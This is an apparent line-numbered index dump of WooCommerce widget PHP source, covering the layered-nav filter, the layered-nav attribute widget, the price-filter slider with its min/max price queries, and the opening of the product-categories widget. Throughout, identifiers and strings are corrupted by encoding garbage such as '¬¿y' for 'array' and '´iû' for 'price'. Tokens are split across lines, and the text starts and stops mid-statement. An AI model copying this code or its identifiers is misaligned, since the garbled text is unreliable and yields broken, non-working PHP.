 => 
$d©a
 ) {

72 
	`fÜ—ch
 ( 
$d©a
['‹rms'] 
as
 
$‹rm_id
 ) {

73 
$‹rm
 = 
	`g‘_‹rm
Ğ
$‹rm_id
, 
$xÚomy
 );

74 
$xÚomy_f‹r
 = 
	`¡r_»¶aû
Ğ'·_', '', 
$xÚomy
 );

75 
$cu¼’t_f‹r
 = ! 
	`em±y
Ğ
$_GET
[ 'f‹r_' . 
$xÚomy_f‹r
 ] ) ? $_GET[ 'filter_' . $taxonomy_filter ] : '';

76 
$Ãw_f‹r
 = 
	`¬¿y_m­
Ğ'absšt', 
	`ex¶ode
Ğ',', 
$cu¼’t_f‹r
 ) );

77 
$Ãw_f‹r
 = 
	`¬¿y_diff
Ğ$Ãw_f‹r, 
	`¬¿y
Ğ
$‹rm_id
 ) );

79 
$lšk
 = 
	`»move_qu”y_¬g
Ğ'f‹r_' . 
$xÚomy_f‹r
 );

81 iàĞĞ
$Ãw_f‹r
 ) > 0 )

82 
$lšk
 = 
	`add_qu”y_¬g
Ğ'f‹r_' . 
$xÚomy_f‹r
, 
	`im¶ode
Ğ',', 
$Ãw_f‹r
 ), $link );

84 
echo
 '<l˜şass="cho£n"><¨t™Ë="' . 
	`__
Ğ'Removf‹r', 'woocomm”û' ) . '" h»f="' . 
	`esc_u¾
Ğ
$lšk
 ) . '">' . 
$‹rm
->
Çme
 . '</a></li>';

89 iàĞ
$mš_´iû
 ) {

90 
$lšk
 = 
	`»move_qu”y_¬g
( 'min_price' );

91 
echo
 '<l˜şass="cho£n"><¨t™Ë="' . 
	`__
Ğ'Removf‹r', 'woocomm”û' ) . '" h»f="' . 
	`esc_u¾
Ğ
$lšk
 ) . '">' . __Ğ'Mš', 'woocomm”û' ) . ' ' . 
	`wc_´iû
Ğ
$mš_´iû
 ) . '</a></li>';

94 iàĞ
$max_´iû
 ) {

95 
$lšk
 = 
	`»move_qu”y_¬g
( 'max_price' );

96 
echo
 '<l˜şass="cho£n"><¨t™Ë="' . 
	`__
Ğ'Removf‹r', 'woocomm”û' ) . '" h»f="' . 
	`esc_u¾
Ğ
$lšk
 ) . '">' . __Ğ'Max', 'woocomm”û' ) . ' ' . 
	`wc_´iû
Ğ
$max_´iû
 ) . '</a></li>';

99 
echo
 "</ul>";

101 
echo
 
$aá”_widg‘
;

103 
	}
}

106 
»gi¡”_widg‘
( 'WC_Widget_Layered_Nav_Filters' );

	@includes/widgets/class-wc-widget-layered-nav.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Widg‘_Lay”ed_Nav
 
ex‹nds
 
	mWC_Widg‘
 {

19 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

20 
$this
->
widg‘_cssşass
 = 'woocommerce widget_layered_nav';

21 
$this
->
widg‘_desütiÚ
 = 
	`__
( 'Shows‡ custom‡ttribute in‡ widget which†ets you‚arrow downhe†ist of…roducts when viewing…roduct categories.', 'woocommerce' );

22 
$this
->
widg‘_id
 = 'woocommerce_layered_nav';

23 
$this
->
widg‘_Çme
 = 
	`__
( 'WooCommerce Layered Nav', 'woocommerce' );

25 
·»Á
::
	`__cÚ¡ruù
();

37 
public
 
funùiÚ
 
	$upd©e
Ğ
$Ãw_š¡ªû
, 
$Şd_š¡ªû
 ) {

38 
$this
->
	`š™_£‰šgs
();

39  
·»Á
::
	`upd©e
Ğ
$Ãw_š¡ªû
, 
$Şd_š¡ªû
 );

40 
	}
}

50 
public
 
funùiÚ
 
	$fÜm
Ğ
$š¡ªû
 ) {

51 
$this
->
	`š™_£‰šgs
();

52 
·»Á
::
	`fÜm
Ğ
$š¡ªû
 );

53 
	}
}

58 
public
 
funùiÚ
 
	$š™_£‰šgs
() {

59 
$©Œibu‹_¬¿y
 = 
	`¬¿y
();

60 
$©Œibu‹_xÚom›s
 = 
	`wc_g‘_©Œibu‹_xÚom›s
();

61 iàĞ
$©Œibu‹_xÚom›s
 )

62 
	`fÜ—ch
 ( 
$©Œibu‹_xÚom›s
 
as
 
$x
 )

63 iàĞ
	`xÚomy_exi¡s
Ğ
	`wc_©Œibu‹_xÚomy_Çme
Ğ
$x
->
©Œibu‹_Çme
 ) ) )

64 
$©Œibu‹_¬¿y
[ 
$x
->
©Œibu‹_Çme
 ] = $tax->attribute_name;

66 
$this
->
£‰šgs
 = 
	`¬¿y
(

67 't™Ë' => 
	`¬¿y
(

69 '¡d' => 
	`__
( 'Filter by', 'woocommerce' ),

70 'Ïb–' => 
	`__
( 'Title', 'woocommerce' )

72 '©Œibu‹' => 
	`¬¿y
(

75 'Ïb–' => 
	`__
( 'Attribute', 'woocommerce' ),

76 'İtiÚs' => 
$©Œibu‹_¬¿y


78 'di¥Ïy_ty³' => 
	`¬¿y
(

81 'Ïb–' => 
	`__
( 'Displayype', 'woocommerce' ),

82 'İtiÚs' => 
	`¬¿y
(

83 'li¡' => 
	`__
( 'List', 'woocommerce' ),

84 'drİdown' => 
	`__
( 'Dropdown', 'woocommerce' )

87 'qu”y_ty³' => 
	`¬¿y
(

90 'Ïb–' => 
	`__
( 'Queryype', 'woocommerce' ),

91 'İtiÚs' => 
	`¬¿y
(

92 'ªd' => 
	`__
( 'AND', 'woocommerce' ),

93 'Ü' => 
	`__
( 'OR', 'woocommerce' )

97 
	}
}

108 
public
 
funùiÚ
 
	$widg‘
Ğ
$¬gs
, 
$š¡ªû
 ) {

109 
glob®
 
$_cho£n_©Œibu‹s
;

111 
	`exŒaù
Ğ
$¬gs
 );

113 iàĞ! 
	`is_po¡_ty³_¬chive
Ğ'´oduù' ) && ! 
	`is_x
Ğ
	`g‘_objeù_xÚom›s
( 'product' ) ) )

116 
$cu¼’t_‹rm
 = 
	`is_x
(è? 
	`g‘_qu”›d_objeù
()->
‹rm_id
 : '';

117 
$cu¼’t_x
 = 
	`is_x
(è? 
	`g‘_qu”›d_objeù
()->
xÚomy
 : '';

118 
$t™Ë
 = 
	`­¶y_f‹rs
('widg‘_t™Ë', 
$š¡ªû
['t™Ë'], $š¡ªû, 
$this
->
id_ba£
);

119 
$xÚomy
 = 
	`is£t
Ğ
$š¡ªû
['©Œibu‹'] ) ? 
	`wc_©Œibu‹_xÚomy_Çme
($instance['attribute']) : '';

120 
$qu”y_ty³
 = 
	`is£t
Ğ
$š¡ªû
['query_type'] ) ? $instance['query_type'] : 'and';

121 
$di¥Ïy_ty³
 = 
	`is£t
Ğ
$š¡ªû
['display_type'] ) ? $instance['display_type'] : 'list';

123 iàĞ! 
	`xÚomy_exi¡s
Ğ
$xÚomy
 ) )

126 
$g‘_‹rms_¬gs
 = 
	`¬¿y
( 'hide_empty' => '1' );

128 
$Üd”by
 = 
	`wc_©Œibu‹_Üd”by
Ğ
$xÚomy
 );

130  
$Üd”by
 ) {

132 
$g‘_‹rms_¬gs
['orderby'] = 'name';

133 
$g‘_‹rms_¬gs
['m’u_Üd”'] = 
çl£
;

136 
$g‘_‹rms_¬gs
['orderby'] = 'id';

137 
$g‘_‹rms_¬gs
['order'] = 'ASC';

138 
$g‘_‹rms_¬gs
['m’u_Üd”'] = 
çl£
;

141 
$g‘_‹rms_¬gs
['menu_order'] = 'ASC';

145 
$‹rms
 = 
	`g‘_‹rms
Ğ
$xÚomy
, 
$g‘_‹rms_¬gs
 );

147 iàĞ
	`couÁ
Ğ
$‹rms
 ) > 0 ) {

149 
	`ob_¡¬t
();

151 
$found
 = 
çl£
;

153 
echo
 
$befÜe_widg‘
 . 
$befÜe_t™Ë
 . 
$t™Ë
 . 
$aá”_t™Ë
;

156 iàĞ! 
	`is_x
(è&& 
	`is_¬¿y
Ğ
$_cho£n_©Œibu‹s
 ) && 
	`¬¿y_key_exi¡s
Ğ
$xÚomy
, $_chosen_attributes ) )

157 
$found
 = 
Œue
;

159 iàĞ
$di¥Ïy_ty³
 == 'dropdown' ) {

162 iàĞ
$cu¼’t_x
 && 
$xÚomy
 == $current_tax ) {

164 
$found
 = 
çl£
;

168 
$xÚomy_f‹r
 = 
	`¡r_»¶aû
Ğ'·_', '', 
$xÚomy
 );

170 
$found
 = 
çl£
;

172 
echo
 '<£Ëù id="drİdown_Ïy”ed_Çv_' . 
$xÚomy_f‹r
 . '">';

174 
echo
 '<İtiÚ v®ue="">' . 
	`¥rštf
Ğ
	`__
Ğ'Any %s', 'woocomm”û' ), 
	`wc_©Œibu‹_Ïb–
Ğ
$xÚomy
 ) ) .'</option>';

176 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 ) {

179 iàĞ
$‹rm
->
‹rm_id
 =ğ
$cu¼’t_‹rm
 )

183 
$Œªs›Á_Çme
 = 'wc_Ê_couÁ_' . 
	`md5
Ğ
	`§n™ize_key
Ğ
$xÚomy
 ) . sª™ize_keyĞ
$‹rm
->
‹rm_id
 ) );

185 iàĞ
çl£
 ==ğĞ
$_´oduùs_š_‹rm
 = 
	`g‘_Œªs›Á
Ğ
$Œªs›Á_Çme
 ) ) ) {

187 
$_´oduùs_š_‹rm
 = 
	`g‘_objeùs_š_‹rm
Ğ
$‹rm
->
‹rm_id
, 
$xÚomy
 );

189 
	`£t_Œªs›Á
Ğ
$Œªs›Á_Çme
, 
$_´oduùs_š_‹rm
, 
YEAR_IN_SECONDS
 );

192 
$İtiÚ_is_£t
 = ( 
	`is£t
Ğ
$_cho£n_©Œibu‹s
[ 
$xÚomy
 ] ) && 
	`š_¬¿y
Ğ
$‹rm
->
‹rm_id
, $_chosen_attributes[ $taxonomy ]['terms'] ) );

195 iàĞ
$qu”y_ty³
 == 'and' ) {

197 
$couÁ
 = Ğ
	`¬¿y_š‹r£ù
Ğ
$_´oduùs_š_‹rm
, 
	`WC
()->
qu”y
->
f‹»d_´oduù_ids
 ) );

199 iàĞ
$couÁ
 > 0 )

200 
$found
 = 
Œue
;

202 iàĞ
$couÁ
 =ğ0 && ! 
$İtiÚ_is_£t
 )

208 
$couÁ
 = Ğ
	`¬¿y_š‹r£ù
Ğ
$_´oduùs_š_‹rm
, 
	`WC
()->
qu”y
->
unf‹»d_´oduù_ids
 ) );

210 iàĞ
$couÁ
 > 0 )

211 
$found
 = 
Œue
;

215 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$‹rm
->
‹rm_id
 ) . '" '.
	`£Ëùed
Ğ
	`is£t
Ğ
$_GET
[ 'f‹r_' . 
$xÚomy_f‹r
 ] ) ? $_GET[ 'f‹r_' .$xÚomy_f‹¸] : '' , $‹rm->‹rm_id, 
çl£
 ) . '>' . $‹rm->
Çme
 . '</option>';

218 
echo
 '</select>';

220 
	`wc_’queue_js
("

222 
	`jQu”y
('#drİdown_Ïy”ed_Çv_$xÚomy_f‹r').
	`chªge
(
	`funùiÚ
(){

224 
loÿtiÚ
.
h»f
 = '" .ƒsc_u¾_¿wĞ´eg_»¶aûĞ'%\/
·ge
/[0-9]+%', '',‡dd_qu”y_¬g('
f‹ršg
', '1',„emove_qu”y_¬gĞ¬¿yĞ'·ge', '
f‹r_
' . $xÚomy_f‹¸èèèèè. "&f‹r_$xÚomy_f‹r=' + 
	`jQu”y
('#drİdown_Ïy”ed_Çv_$xÚomy_f‹r').
	`v®
();

235 
echo
 "<ul>";

237 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 ) {

240 
$Œªs›Á_Çme
 = 'wc_Ê_couÁ_' . 
	`md5
Ğ
	`§n™ize_key
Ğ
$xÚomy
 ) . sª™ize_keyĞ
$‹rm
->
‹rm_id
 ) );

242 iàĞ
çl£
 ==ğĞ
$_´oduùs_š_‹rm
 = 
	`g‘_Œªs›Á
Ğ
$Œªs›Á_Çme
 ) ) ) {

244 
$_´oduùs_š_‹rm
 = 
	`g‘_objeùs_š_‹rm
Ğ
$‹rm
->
‹rm_id
, 
$xÚomy
 );

246 
	`£t_Œªs›Á
Ğ
$Œªs›Á_Çme
, 
$_´oduùs_š_‹rm
 );

249 
$İtiÚ_is_£t
 = ( 
	`is£t
Ğ
$_cho£n_©Œibu‹s
[ 
$xÚomy
 ] ) && 
	`š_¬¿y
Ğ
$‹rm
->
‹rm_id
, $_chosen_attributes[ $taxonomy ]['terms'] ) );

252 iàĞ
$cu¼’t_‹rm
 =ğ
$‹rm
->
‹rm_id
 )

256 iàĞ
$qu”y_ty³
 == 'and' ) {

258 
$couÁ
 = Ğ
	`¬¿y_š‹r£ù
Ğ
$_´oduùs_š_‹rm
, 
	`WC
()->
qu”y
->
f‹»d_´oduù_ids
 ) );

260 iàĞ
$couÁ
 > 0 && 
$cu¼’t_‹rm
 !=ğ
$‹rm
->
‹rm_id
 )

261 
$found
 = 
Œue
;

263 iàĞ
$couÁ
 =ğ0 && ! 
$İtiÚ_is_£t
 )

269 
$couÁ
 = Ğ
	`¬¿y_š‹r£ù
Ğ
$_´oduùs_š_‹rm
, 
	`WC
()->
qu”y
->
unf‹»d_´oduù_ids
 ) );

271 iàĞ
$couÁ
 > 0 )

272 
$found
 = 
Œue
;

276 
$¬g
 = 'f‹r_' . 
	`§n™ize_t™Ë
Ğ
$š¡ªû
['attribute'] );

278 
$cu¼’t_f‹r
 = ( 
	`is£t
Ğ
$_GET
[ 
$¬g
 ] ) ) ? 
	`ex¶ode
Ğ',', $_GET[ $¬g ] ) : 
	`¬¿y
();

280 iàĞ! 
	`is_¬¿y
Ğ
$cu¼’t_f‹r
 ) )

281 
$cu¼’t_f‹r
 = 
	`¬¿y
();

283 
$cu¼’t_f‹r
 = 
	`¬¿y_m­
( 'esc_attr', $current_filter );

285 iàĞ! 
	`š_¬¿y
Ğ
$‹rm
->
‹rm_id
, 
$cu¼’t_f‹r
 ) )

286 
$cu¼’t_f‹r
[] = 
$‹rm
->
‹rm_id
;

289 iàĞ
	`defšed
( 'SHOP_IS_ON_FRONT' ) ) {

290 
$lšk
 = 
	`home_u¾
();

291 } 
	`–£if
 ( 
	`is_po¡_ty³_¬chive
Ğ'´oduù' ) || 
	`is_·ge
Ğ
	`wc_g‘_·ge_id
('shop') ) ) {

292 
$lšk
 = 
	`g‘_po¡_ty³_¬chive_lšk
( 'product' );

294 
$lšk
 = 
	`g‘_‹rm_lšk
Ğ
	`g‘_qu”y_v¬
('term'), get_query_var('taxonomy') );

298 iàĞ
$_cho£n_©Œibu‹s
 ) {

299 
	`fÜ—ch
 ( 
$_cho£n_©Œibu‹s
 
as
 
$Çme
 => 
$d©a
 ) {

300 iàĞ
$Çme
 !=ğ
$xÚomy
 ) {

303  
	`š_¬¿y
Ğ
$cu¼’t_‹rm
, 
$d©a
['terms'] ) ) {

304 
$key
 = 
	`¬¿y_£¬ch
Ğ
$cu¼’t_‹rm
, 
$d©a
 );

305 
	`un£t
Ğ
$d©a
['‹rms'][
$key
] );

309 
$f‹r_Çme
 = 
	`§n™ize_t™Ë
Ğ
	`¡r_»¶aû
Ğ'·_', '', 
$Çme
 ) );

311 iàĞ! 
	`em±y
Ğ
$d©a
['terms'] ) )

312 
$lšk
 = 
	`add_qu”y_¬g
Ğ'f‹r_' . 
$f‹r_Çme
, 
	`im¶ode
Ğ',', 
$d©a
['terms'] ), $link );

314 iàĞ
$d©a
['query_type'] == 'or' )

315 
$lšk
 = 
	`add_qu”y_¬g
Ğ'qu”y_ty³_' . 
$f‹r_Çme
, 'or', $link );

321 iàĞ
	`is£t
Ğ
$_GET
['min_price'] ) )

322 
$lšk
 = 
	`add_qu”y_¬g
Ğ'mš_´iû', 
$_GET
['min_price'], $link );

324 iàĞ
	`is£t
Ğ
$_GET
['max_price'] ) )

325 
$lšk
 = 
	`add_qu”y_¬g
Ğ'max_´iû', 
$_GET
['max_price'], $link );

328 iàĞ
	`is£t
Ğ
$_GET
['orderby'] ) )

329 
$lšk
 = 
	`add_qu”y_¬g
Ğ'Üd”by', 
$_GET
['orderby'], $link );

332 iàĞ
	`is£t
Ğ
$_cho£n_©Œibu‹s
[ 
$xÚomy
 ] ) && 
	`is_¬¿y
Ğ$_cho£n_©Œibu‹s[ $xÚomy ]['‹rms'] ) && 
	`š_¬¿y
Ğ
$‹rm
->
‹rm_id
, $_chosen_attributes[ $taxonomy ]['terms'] ) ) {

334 
$şass
 = 'class="chosen"';

337 iàĞĞ
$cu¼’t_f‹r
 ) > 1 ) {

338 
$cu¼’t_f‹r_w™hout_this
 = 
	`¬¿y_diff
Ğ
$cu¼’t_f‹r
, 
	`¬¿y
Ğ
$‹rm
->
‹rm_id
 ) );

339 
$lšk
 = 
	`add_qu”y_¬g
Ğ
$¬g
, 
	`im¶ode
Ğ',', 
$cu¼’t_f‹r_w™hout_this
 ), $link );

344 
$şass
 = '';

345 
$lšk
 = 
	`add_qu”y_¬g
Ğ
$¬g
, 
	`im¶ode
Ğ',', 
$cu¼’t_f‹r
 ), $link );

350 iàĞ
	`g‘_£¬ch_qu”y
() )

351 
$lšk
 = 
	`add_qu”y_¬g
Ğ's', 
	`g‘_£¬ch_qu”y
(), $link );

354 iàĞ
	`is£t
Ğ
$_GET
['post_type'] ) )

355 
$lšk
 = 
	`add_qu”y_¬g
Ğ'po¡_ty³', 
$_GET
['post_type'], $link );

358 iàĞ
$qu”y_ty³
 =ğ'Ü' && ! ( Ğ
$cu¼’t_f‹r
 ) =ğ1 && 
	`is£t
Ğ
$_cho£n_©Œibu‹s
[ 
$xÚomy
 ]['‹rms'] ) && 
	`is_¬¿y
Ğ$_cho£n_©Œibu‹s[ $xÚomy ]['‹rms'] ) && 
	`š_¬¿y
Ğ
$‹rm
->
‹rm_id
, $_chosen_attributes[ $taxonomy ]['terms'] ) ) )

359 
$lšk
 = 
	`add_qu”y_¬g
Ğ'qu”y_ty³_' . 
	`§n™ize_t™Ë
Ğ
$š¡ªû
['attribute'] ), 'or', $link );

361 
echo
 '<l˜' . 
$şass
 . '>';

363 
	`echo
 ( 
$couÁ
 > 0 || 
$İtiÚ_is_£t
 ) ? '<¨h»f="' . 
	`esc_u¾
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_Ïy”ed_Çv_lšk', 
$lšk
 ) ) . '">' : '<span>';

365 
echo
 
$‹rm
->
Çme
;

367 
	`echo
 ( 
$couÁ
 > 0 || 
$İtiÚ_is_£t
 ) ? '</a>' : '</span>';

369 
echo
 ' <sm®Èşass="couÁ">' . 
$couÁ
 . '</small></li>';

373 
echo
 "</ul>";

377 
echo
 
$aá”_widg‘
;

379 iàĞ! 
$found
 )

380 
	`ob_’d_ş—n
();

382 
echo
 
	`ob_g‘_ş—n
();

384 
	}
}

387 
»gi¡”_widg‘
( 'WC_Widget_Layered_Nav' );

	@includes/widgets/class-wc-widget-price-filter.php

1 <?
php


14 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_Widg‘_Priû_F‹r
 
ex‹nds
 
	mWC_Widg‘
 {

21 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

22 
$this
->
widg‘_cssşass
 = 'woocommerce widget_price_filter';

23 
$this
->
widg‘_desütiÚ
 = 
	`__
( 'Shows‡…rice filter slider in‡ widget which†ets you‚arrow downhe†ist of shown…roducts when viewing…roduct categories.', 'woocommerce' );

24 
$this
->
widg‘_id
 = 'woocommerce_price_filter';

25 
$this
->
widg‘_Çme
 = 
	`__
( 'WooCommerce Price Filter', 'woocommerce' );

26 
$this
->
£‰šgs
 = 
	`¬¿y
(

27 't™Ë' => 
	`¬¿y
(

29 '¡d' => 
	`__
( 'Filter by…rice', 'woocommerce' ),

30 'Ïb–' => 
	`__
( 'Title', 'woocommerce' )

33 
·»Á
::
	`__cÚ¡ruù
();

45 
public
 
funùiÚ
 
	$widg‘
Ğ
$¬gs
, 
$š¡ªû
 ) {

46 
glob®
 
$_cho£n_©Œibu‹s
, 
$wpdb
, 
$woocomm”û
, 
$wp_qu”y
, 
$wp
;

48 
	`exŒaù
Ğ
$¬gs
 );

50 iàĞ! 
	`is_po¡_ty³_¬chive
Ğ'´oduù' ) && ! 
	`is_x
Ğ
	`g‘_objeù_xÚom›s
( 'product' ) ) )

53 iàĞĞ
	`WC
()->
qu”y
->
unf‹»d_´oduù_ids
 ) == 0 )

56 
$mš_´iû
 = 
	`is£t
Ğ
$_GET
['mš_´iû'] ) ? 
	`esc_©Œ
( $_GET['min_price'] ) : '';

57 
$max_´iû
 = 
	`is£t
Ğ
$_GET
['max_´iû'] ) ? 
	`esc_©Œ
( $_GET['max_price'] ) : '';

59 
	`wp_’queue_süt
( 'wc-price-slider' );

61 
$t™Ë
 = 
	`­¶y_f‹rs
Ğ'widg‘_t™Ë', 
$š¡ªû
['t™Ë'], $š¡ªû, 
$this
->
id_ba£
 );

64 
$f›lds
 = '';

66 iàĞ
	`g‘_£¬ch_qu”y
() )

67 
$f›lds
 .ğ'<špuˆty³="hidd’"‚ame="s" v®ue="' . 
	`g‘_£¬ch_qu”y
() . '" />';

69 iàĞ! 
	`em±y
Ğ
$_GET
['post_type'] ) )

70 
$f›lds
 .ğ'<špuˆty³="hidd’"‚ame="po¡_ty³" v®ue="' . 
	`esc_©Œ
Ğ
$_GET
['post_type'] ) . '" />';

72 iàĞ! 
	`em±y
 ( 
$_GET
['product_cat'] ) )

73 
$f›lds
 .ğ'<špuˆty³="hidd’"‚ame="´oduù_ÿt" v®ue="' . 
	`esc_©Œ
Ğ
$_GET
['product_cat'] ) . '" />';

75 iàĞ! 
	`em±y
Ğ
$_GET
['product_tag'] ) )

76 
$f›lds
 .ğ'<špuˆty³="hidd’"‚ame="´oduù_g" v®ue="' . 
	`esc_©Œ
Ğ
$_GET
['product_tag'] ) . '" />';

78 iàĞ! 
	`em±y
Ğ
$_GET
['orderby'] ) )

79 
$f›lds
 .ğ'<špuˆty³="hidd’"‚ame="Üd”by" v®ue="' . 
	`esc_©Œ
Ğ
$_GET
['orderby'] ) . '" />';

81 iàĞ
$_cho£n_©Œibu‹s
 ) 
	`fÜ—ch
 ( $_cho£n_©Œibu‹ 
as
 
$©Œibu‹
 => 
$d©a
 ) {

83 
$xÚomy_f‹r
 = 'f‹r_' . 
	`¡r_»¶aû
Ğ'·_', '', 
$©Œibu‹
 );

85 
$f›lds
 .ğ'<špuˆty³="hidd’"‚ame="' . 
	`esc_©Œ
Ğ
$xÚomy_f‹r
 ) . '" v®ue="' .ƒsc_©ŒĞ
	`im¶ode
Ğ',', 
$d©a
['terms'] ) ) . '" />';

87 iàĞ
$d©a
['query_type'] == 'or' )

88 
$f›lds
 .ğ'<špuˆty³="hidd’"‚ame="' . 
	`esc_©Œ
Ğ
	`¡r_»¶aû
Ğ'·_', 'qu”y_ty³_', 
$©Œibu‹
 ) ) . '" value="or" />';

91 
$mš
 = 
$max
 = 0;

92 
$po¡_mš
 = 
$po¡_max
 = '';

94 iàĞĞ
	`WC
()->
qu”y
->
Ïy”ed_Çv_´oduù_ids
 ) === 0 ) {

95 
$mš
 = 
	`æoÜ
Ğ
$wpdb
->
	`g‘_v¬
(

96 
$wpdb
->
	`´•¬e
('

97 
SELECT
 
	`mš
(
m‘a_v®ue
 + 0)

98 
FROM
 %1
$s


99 
LEFT
 
JOIN
 %2
$s
 
ON
 %1$s.
ID
 = %2$s.
po¡_id


100 
	`WHERE
 ( 
m‘a_key
 = \'%3$s\' OR meta_key = \'%4$s\' )

101 
AND
 
m‘a_v®ue
 != ""

102 ', $wpdb->po¡s, $wpdb->po¡m‘a, '
_´iû
', '
_mš_v¬ŸtiÚ_´iû
' )

104 
$max
 = 
	`û
Ğ
$wpdb
->
	`g‘_v¬
(

105 
$wpdb
->
	`´•¬e
('

106 
SELECT
 
	`max
(
m‘a_v®ue
 + 0)

107 
FROM
 %1
$s


108 
LEFT
 
JOIN
 %2
$s
 
ON
 %1$s.
ID
 = %2$s.
po¡_id


109 
WHERE
 
m‘a_key
 = \'%3$s\'

110 ', $wpdb->po¡s, $wpdb->po¡m‘a, '
_´iû
' )

113 
$mš
 = 
	`æoÜ
Ğ
$wpdb
->
	`g‘_v¬
(

114 
$wpdb
->
	`´•¬e
('

115 
SELECT
 
	`mš
(
m‘a_v®ue
 + 0)

116 
FROM
 %1
$s


117 
LEFT
 
JOIN
 %2
$s
 
ON
 %1$s.
ID
 = %2$s.
po¡_id


118 
	`WHERE
 ( 
m‘a_key
 =\'%3$s\' OR meta_key =\'%4$s\' )

119 
AND
 
m‘a_v®ue
 != ""

120 
	`AND
 (

121 %1
$s
.
ID
 
	`IN
 (' . im¶odeĞ',',‡¼ay_m­Ğ'
absšt
', WC()->query->layered_nav_product_ids ) ) . ')

122 
	`OR
 (

123 %1
$s
.
po¡_·»Á
 
	`IN
 (' . im¶odeĞ',',‡¼ay_m­Ğ'
absšt
', WC()->query->layered_nav_product_ids ) ) . ')

124 
AND
 %1
$s
.
po¡_·»Á
 != 0

127 ', $wpdb->po¡s, $wpdb->po¡m‘a, '
_´iû
', '
_mš_v¬ŸtiÚ_´iû
'

129 
$max
 = 
	`û
Ğ
$wpdb
->
	`g‘_v¬
(

130 
$wpdb
->
	`´•¬e
('

131 
SELECT
 
	`max
(
m‘a_v®ue
 + 0)

132 
FROM
 %1
$s


133 
LEFT
 
JOIN
 %2
$s
 
ON
 %1$s.
ID
 = %2$s.
po¡_id


134 
WHERE
 
m‘a_key
 =\'%3$s\'

135 
	`AND
 (

136 %1
$s
.
ID
 
	`IN
 (' . im¶odeĞ',',‡¼ay_m­Ğ'
absšt
', WC()->query->layered_nav_product_ids ) ) . ')

137 
	`OR
 (

138 %1
$s
.
po¡_·»Á
 
	`IN
 (' . im¶odeĞ',',‡¼ay_m­Ğ'
absšt
', WC()->query->layered_nav_product_ids ) ) . ')

139 
AND
 %1
$s
.
po¡_·»Á
 != 0

142 ', $wpdb->po¡s, $wpdb->po¡m‘a, '
_´iû
'

146 iàĞ
$mš
 =ğ
$max
 )

149 
echo
 
$befÜe_widg‘
 . 
$befÜe_t™Ë
 . 
$t™Ë
 . 
$aá”_t™Ë
;

151 iàĞ
	`g‘_İtiÚ
( 'permalink_structure' ) == '' )

152 
$fÜm_aùiÚ
 = 
	`»move_qu”y_¬g
Ğ
	`¬¿y
Ğ'·ge', '·ged' ), 
	`add_qu”y_¬g
Ğ
$wp
->
qu”y_¡ršg
, '', 
	`home_u¾
Ğ$wp->
»que¡
 ) ) );

154 
$fÜm_aùiÚ
 = 
	`´eg_»¶aû
Ğ'%\/·ge/[0-9]+%', '', 
	`home_u¾
Ğ
$wp
->
»que¡
 ) );

156 
echo
 '<fÜm m‘hod="g‘"‡ùiÚ="' . 
	`esc_©Œ
Ğ
$fÜm_aùiÚ
 ) . '">

157 <
div
 
şass
="price_slider_wrapper">

158 <
div
 
şass
="´iû_¦id”" 
¡yË
="display:none;"></div>

159 <
div
 
şass
="price_slider_amount">

160 <
šput
 
ty³
="‹xt" 
id
="mš_´iû" 
Çme
="mš_´iû" 
v®ue
="' .ƒsc_©ŒĞ$mš_´iû ) . '" 
d©a
-
mš
="'.esc_©ŒĞ$mš ).'" 
¶aûhŞd”
="'.__('Min…rice', 'woocommerce' ).'" />

161 <
šput
 
ty³
="‹xt" 
id
="max_´iû" 
Çme
="max_´iû" 
v®ue
="' .ƒsc_©ŒĞ$max_´iû ) . '" 
d©a
-
max
="'.esc_©ŒĞ$max ).'" 
¶aûhŞd”
="'.__( 'Max…rice', 'woocommerce' ).'" />

162 <
bu‰Ú
 
ty³
="subm™" 
şass
="bu‰Ú">'.__Ğ'
F‹r
', '
woocomm”û
' ).'</button>

163 <
div
 
şass
="´iû_Ïb–" 
¡yË
="display:none;">

164 '.__Ğ'
Priû
:', '
woocomm”û
' ).' <
¥ª
 
şass
="äom"></¥ª> &
mdash
; <span class="to"></span>

165 </
div
>

167 <
div
 
şass
="clear"></div>

168 </
div
>

169 </
div
>

170 </
fÜm
>';

172 
echo
 
$aá”_widg‘
;

173 
	}
}

176 
»gi¡”_widg‘
( 'WC_Widget_Price_Filter' );

	@includes/widgets/class-wc-widget-product-categories.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Widg‘_Produù_C©egÜ›s
 
ex‹nds
 
	mWC_Widg‘
 {

16 
public
 
	m$ÿt_ªû¡Üs
;

17 
public
 
	m$cu¼’t_ÿt
;

22 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

23 
$this
->
widg‘_cssşass
 = 'woocommerce widget_product_categories';

24 
$this
->
widg‘_desütiÚ
 = 
	`__
( 'A†ist or dropdown of…roduct categories.', 'woocommerce' );

25 
$this
->
widg‘_id
 = 'woocommerce_product_categories';

26 
$this
->
widg‘_Çme
 = 
	`__
( 'WooCommerce Product Categories', 'woocommerce' );

27 
$this
->
£‰šgs
 = 
	`¬¿y
(

28 't™Ë' => 
	`¬¿y
(

30 '¡d' => 
	`__
( 'Product Categories', 'woocommerce' ),

31 'Ïb–' => 
	`__
( 'Title', 'woocommerce' )

33 'Üd”by' => 
	`¬¿y
(

36 'Ïb–' => 
	`__
( 'Order by', 'woocommerce' ),

37 'İtiÚs' => 
	`¬¿y
(

38 'Üd”' => 
	`__
( 'Category Order', 'woocommerce' ),

39 'Çme' => 
	`__
( 'Name', 'woocommerce' )

42 'drİdown' => 
	`¬¿y
(

45 'Ïb–' => 
	`__
( 'Show‡s dropdown', 'woocommerce' )

47 'couÁ' => 
	`¬¿y
(

50 'Ïb–' => 
	`__
( 'Show…ost counts', 'woocommerce' )

52 'h›¿rchiÿl' => 
	`¬¿y
(

55 'Ïb–' => 
	`__
( 'Show hierarchy', 'woocommerce' )

57 'show_chd»n_Úly' => 
	`¬¿y
(

60 'Ïb–' => 
	`__
( 'Only show children ofhe current category', 'woocommerce' )

63 
·»Á
::
	`__cÚ¡ruù
();

75 
public
 
funùiÚ
 
	$widg‘
Ğ
$¬gs
, 
